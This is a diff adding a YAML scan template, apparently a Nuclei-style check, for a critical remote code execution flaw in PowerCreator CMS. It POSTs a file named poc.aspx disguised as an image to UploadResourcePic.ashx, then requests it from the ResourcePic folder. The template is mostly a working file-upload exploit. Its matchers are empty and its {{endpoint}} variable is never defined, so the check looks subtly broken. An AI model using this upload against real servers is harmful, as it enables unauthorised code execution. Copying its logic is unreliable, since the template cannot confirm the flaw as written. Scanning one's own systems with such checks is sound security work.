@@ -1,0 +1,32 @@
+id: powercreator-cms-rce
+brief:
+    title: PowerCreator CMS - Remote Code Execution
+    by: pikpikcu
+    level: critical
+    about: PowerCreator CMS is susceptible to a remote code execution vulnerability.
+    label:
+        - rce
+        - powercreator
+        - intrusive
+        - fileupload
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/upload/UploadResourcePic.ashx?ResourceID=8382'
+      head:
+        Content-Disposition: form-data;name="file1";filename="poc.aspx";
+        Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
+      body: |-
+        -----------------------------20873900192357278038549710136
+        Content-Disposition: form-data; name="file1"; filename="poc.aspx"
+        Content-Type: image/jpeg
+
+        {{randstr}}
+        -----------------------------20873900192357278038549710136--
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/ResourcePic/{{endpoint}}'
+      signs: []
